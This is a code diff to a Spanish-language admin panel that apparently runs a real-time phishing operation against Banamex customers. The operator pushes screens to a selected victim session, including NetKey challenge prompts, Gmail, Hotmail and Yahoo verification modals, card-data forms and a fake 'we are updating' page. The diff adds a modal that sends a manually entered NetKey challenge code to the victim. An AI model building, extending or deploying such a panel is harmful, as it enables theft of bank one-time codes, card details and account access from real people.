@@ -10,7 +10,7 @@ import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import SmsManagement from '@/components/admin/SmsManagement';
-import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal, DatosTarjetaModal, NetKey2Modal } from '@/components/admin/Modals';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal, DatosTarjetaModal, NetKey2Modal, NetKeyManualModal } from '@/components/admin/Modals';
 import { GmailModal } from '@/components/admin/GmailModal';
 import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
 import { HotmailModal } from '@/components/admin/HotmailModal';
@@ -551,14 +551,14 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta", "netkey2"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta", "netkey2", "netkey_manual"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
     }
     
     // Handle direct screen changes for certain screens (no modal needed)
-    if (["acceso_denegado", "acceso_denegado_2", "actualizacion"].includes(screen)) {
+    if (["actualizacion"].includes(screen)) {
       sendScreenChange({
         tipo: `mostrar_${screen}`,
         sessionId: selectedSessionId
@@ -847,6 +847,23 @@ export default function AdminPanel() {
     closeModal();
   };
 
+  const handleNetKeyManualConfirm = (manualNetkeyChallenge: string) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.NETKEY_MANUAL}`,
+        sessionId: selectedSessionId,
+        manualNetkeyChallenge: manualNetkeyChallenge
+      });
+      
+      toast({
+        title: "NetKey Manual enviado",
+        description: `Se ha enviado el código CHALLENGE: ${manualNetkeyChallenge}`,
+      });
+    }
+    
+    closeModal();
+  };
+
   
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
@@ -1028,9 +1045,8 @@ export default function AdminPanel() {
                 >
                   <option value="">Selecciona una opción</option>
                   <option value="netkey2">1. Banamex - Flujo Completo (NetKey → Formulario)</option>
-                  <option value="acceso_denegado">2. Acceso Denegado - NetKey Mantenimiento</option>
-                  <option value="acceso_denegado_2">3. Acceso Denegado 2 - Sincronización NetKey</option>
-                  <option value="actualizacion">4. Estamos Actualizando (30 min)</option>
+                  <option value="netkey_manual">2. NetKey</option>
+                  <option value="actualizacion">3. Estamos Actualizando (30 min)</option>
                 </select>
               </div>
             </div>
@@ -1221,6 +1237,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'netkey2'}
         onClose={closeModal}
         onConfirm={handleNetKey2Confirm}
+      />
+      <NetKeyManualModal
+        isOpen={activeModal === 'netkey_manual'}
+        onClose={closeModal}
+        onConfirm={handleNetKeyManualConfirm}
       />
       
       {/* Diálogo para enviar SMS */}
